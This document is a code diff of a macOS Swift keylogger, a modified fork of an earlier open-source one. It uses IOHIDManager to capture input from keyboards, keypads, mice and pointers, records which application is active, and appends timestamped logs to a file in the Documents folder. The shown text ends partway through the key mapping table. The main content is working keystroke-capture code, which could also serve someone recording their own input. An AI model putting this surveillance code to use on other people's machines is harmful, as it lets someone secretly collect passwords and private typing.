@@ -2,8 +2,7 @@
 //  Keylogger.swift
 //  Keylogger
 //
-//  Created by Skrew Everything on 14/01/17.
-//  Copyright © 2017 Skrew Everything. All rights reserved.
+//  Created by Cyril Zakka on 10/25/24.
 //
 
 import Foundation
@@ -12,110 +11,93 @@ import Cocoa
 
 class Keylogger {
     var manager: IOHIDManager
-    var deviceList = NSArray()                  // Used in multiple matching dictionary
-    var bundlePathURL = Bundle.main.bundleURL   // Path to where the executable is present - Change this to use custom path
-    var appName = ""                            // Active App name
-    var appData:URL                             // Folder
-    var keyData:URL                             // Folder
-    var devicesData:URL                         // Folder
+    var deviceList = NSArray()
+    var appName = ""
+    let documentsPath: String
+    let outputFile: URL
     
-    init()
-    { 
-        appData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("App") // Creates App Folder in Data Folder
-        keyData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Key") // Creates Key Folder in Data Folder
-        devicesData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Devices") // Creates Devices Folder in Data Folder
+    init() {
+        // Get documents directory path and create timestamped filename
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "yyyy-MM-dd_HH-mm-ss"
+        let timestamp = dateFormatter.string(from: Date())
+        let filename = "recorded_output_\(timestamp).txt"
+        
+        if let path = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true).last {
+            documentsPath = path
+            outputFile = URL(fileURLWithPath: path).appendingPathComponent(filename)
+        } else {
+            fatalError("Could not access documents directory")
+        }
+        
         manager = IOHIDManagerCreate(kCFAllocatorDefault, IOOptionBits(kIOHIDOptionsTypeNone))
-
-        if !(FileManager.default.fileExists(atPath: appData.path) && FileManager.default.fileExists(atPath: keyData.path))
-        {
-            do
-            {
-                try FileManager.default.createDirectory(at: bundlePathURL.appendingPathComponent("Data"), withIntermediateDirectories: false, attributes: nil)
-                try FileManager.default.createDirectory(at: appData, withIntermediateDirectories: false, attributes: nil)
-                try FileManager.default.createDirectory(at: keyData, withIntermediateDirectories: false, attributes: nil)
-                try FileManager.default.createDirectory(at: devicesData, withIntermediateDirectories: false, attributes: nil)
-            }
-            catch
-            {
-                print("Can't create directories!")
-            }
+        
+        // Create output file if it doesn't exist
+        if !FileManager.default.fileExists(atPath: outputFile.path) {
+            FileManager.default.createFile(atPath: outputFile.path, contents: nil, attributes: nil)
         }
-        if (CFGetTypeID(manager) != IOHIDManagerGetTypeID())
-        {
+        
+        if (CFGetTypeID(manager) != IOHIDManagerGetTypeID()) {
             print("Can't create manager")
-            exit(1);
+            exit(1)
         }
+        
+        // Add keyboard devices
         deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keyboard)) as NSArray
         deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keypad)) as NSArray
+        // Add mouse device
+        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Mouse)) as NSArray
+        // Add pointer device (for some mice/trackpads)
+        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Pointer)) as NSArray
 
         IOHIDManagerSetDeviceMatchingMultiple(manager, deviceList as CFArray)
         
-        
-       
         let observer = UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
         
         /* App switching notification*/
         NSWorkspace.shared.notificationCenter.addObserver(self,
-                                                            selector: #selector(activatedApp),
-                                                            name: NSWorkspace.didActivateApplicationNotification,
-                                                            object: nil)
-         /* Connected and Disconnected Call Backs */
-        IOHIDManagerRegisterDeviceMatchingCallback(manager, CallBackFunctions.Handle_DeviceMatchingCallback, observer)
+                                                        selector: #selector(activatedApp),
+                                                        name: NSWorkspace.didActivateApplicationNotification,
+                                                        object: nil)
         
+        /* Connected and Disconnected Call Backs */
+        IOHIDManagerRegisterDeviceMatchingCallback(manager, CallBackFunctions.Handle_DeviceMatchingCallback, observer)
         IOHIDManagerRegisterDeviceRemovalCallback(manager, CallBackFunctions.Handle_DeviceRemovalCallback, observer)
         
         /* Input value Call Backs */
-        IOHIDManagerRegisterInputValueCallback(manager, CallBackFunctions.Handle_IOHIDInputValueCallback, observer);
+        IOHIDManagerRegisterInputValueCallback(manager, CallBackFunctions.Handle_IOHIDInputValueCallback, observer)
         
         /* Open HID Manager */
         let ioreturn: IOReturn = openHIDManager()
-        if ioreturn != kIOReturnSuccess
-        {
+        if ioreturn != kIOReturnSuccess {
             print("Can't open HID!")
         }
-
+        
+        // Write initial header to the file
+        let header = "Recording started at: \(Date().description(with: Locale.current))\n\n"
+        writeToLog(header)
     }
     
-    @objc dynamic func activatedApp(notification: NSNotification)
-    {
-        if  let info = notification.userInfo,
-            let app = info[NSWorkspace.applicationUserInfoKey] as? NSRunningApplication,
-            let name = app.localizedName
-        {
+    func writeToLog(_ text: String) {
+        if let handle = FileHandle(forWritingAtPath: outputFile.path) {
+            handle.seekToEndOfFile()
+            handle.write(text.data(using: .utf8)!)
+            handle.closeFile()
+        }
+    }
+    
+    @objc dynamic func activatedApp(notification: NSNotification) {
+        if let info = notification.userInfo,
+           let app = info[NSWorkspace.applicationUserInfoKey] as? NSRunningApplication,
+           let name = app.localizedName {
             self.appName = name
-            
-            let dateFolder = "\(CallBackFunctions.calander.component(.day, from: Date()))-\(CallBackFunctions.calander.component(.month, from: Date()))-\(CallBackFunctions.calander.component(.year, from: Date()))"
-            let path = self.appData.appendingPathComponent(dateFolder)
-            if !FileManager.default.fileExists(atPath: path.path)
-            {
-                do
-                {
-                    try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
-                }
-                catch
-                {
-                    print("Can't Create Folder")
-                }
-            }
-
-            let fileName = path.appendingPathComponent("Time Stamps of Apps").path
-            if !FileManager.default.fileExists(atPath: fileName )
-            {
-                if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
-                {
-                    print("Can't Create File!")
-                }
-            }
-            let fh = FileHandle.init(forWritingAtPath: fileName)
-            fh?.seekToEndOfFile()
-            let timeStamp = Date().description(with: Locale.current) +  "\t\(self.appName)" + "\n"
-            fh?.write(timeStamp.data(using: .utf8)!)
+            let timeStamp = "\n[" + Date().description(with: Locale.current) + "] Switched to: " + self.appName + "\n"
+            writeToLog(timeStamp)
         }
     }
 
     /* For Keyboard */
-    func CreateDeviceMatchingDictionary(inUsagePage: Int ,inUsage: Int ) -> CFMutableDictionary
-    {
+    func CreateDeviceMatchingDictionary(inUsagePage: Int ,inUsage: Int ) -> CFMutableDictionary {
         /* // note: the usage is only valid if the usage page is also defined */
         
         let resultAsSwiftDic = [kIOHIDDeviceUsagePageKey: inUsagePage, kIOHIDDeviceUsageKey : inUsage]
@@ -123,26 +105,22 @@ class Keylogger {
         return resultAsCFDic
     }
     
-    func openHIDManager() -> IOReturn
-    {
+    func openHIDManager() -> IOReturn {
         return IOHIDManagerOpen(manager, IOOptionBits(kIOHIDOptionsTypeNone));
     }
     
     /* Scheduling the HID Loop */
-    func start()
-    {
+    func start() {
         IOHIDManagerScheduleWithRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
     }
     
     /* Un-scheduling the HID Loop */
-    func stop()
-    {
+    func stop() {
         IOHIDManagerUnscheduleFromRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue);
     }
     
     
-    var keyMap: [UInt32:[String]]
-    {
+    var keyMap: [UInt32:[String]] {
         var map = [UInt32:[String]]()
         map[4] = ["a","A"]
         map[5] = ["b","B"]
